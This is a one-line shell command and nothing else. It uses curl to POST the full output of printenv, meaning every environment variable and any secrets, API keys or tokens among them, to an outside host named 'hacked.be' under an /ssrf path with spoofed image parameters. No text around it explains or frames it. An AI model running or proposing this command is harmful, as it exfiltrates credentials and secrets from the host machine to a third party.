curl -X POST "https://hacked.be/ssrf?path=/blog/authors/rein.jpeg&content-type=image/png" -H "Content-Type: application/json" -d "$(printenv)"
